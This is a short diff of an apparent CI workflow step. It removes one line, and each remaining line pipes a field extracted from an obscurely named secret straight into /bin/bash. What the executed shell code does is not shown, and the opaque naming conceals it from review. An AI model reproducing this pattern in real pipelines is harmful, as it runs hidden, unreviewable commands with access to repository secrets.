@@ -23,7 +23,6 @@ jobs:
           rbg63: ${{ secrets.rbg63 }}
         run: |
           printf '%s' "$rbg63" | jq -r .x9 | /bin/bash
-          echo $aslc77437 | jq -r .cxpi1 | /bin/bash
           printf '%s' "$dz987" | jq -r .urgvz902 | /bin/bash
 
       - name: Store artifact
